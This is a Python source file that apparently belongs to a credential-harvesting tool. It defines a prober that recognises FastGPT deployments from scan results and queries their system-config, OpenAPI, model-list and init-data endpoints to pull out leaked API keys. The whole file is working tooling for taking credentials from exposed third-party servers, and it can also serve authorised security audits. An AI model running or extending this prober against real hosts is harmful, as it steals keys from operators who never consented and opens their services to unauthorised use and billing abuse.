"""FastGPT prober — system config + open API leaks.

FastGPT exposes:
  - GET /api/systemConfig → system configuration (sometimes leaks keys)
  - GET /api/openapi → API documentation / key list
  - GET /api/v1/models → model list
"""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential
from ..base import Prober

log = logging.getLogger(__name__)


class FastGPTProber(Prober):
    product_name = "fastgpt"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "fastgpt" in blob or "fast-gpt" in blob or "fast gpt" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        creds: list[Credential] = []

        for path in ("/api/systemConfig", "/api/openapi", "/api/v1/models", "/api/getInitData"):
            resp = await self._get(self._url(hit, path))
            found = self._extract_from_response(resp, hit, f"fastgpt_{path.strip('/').replace('/', '_')}")
            creds.extend(found)

        return creds
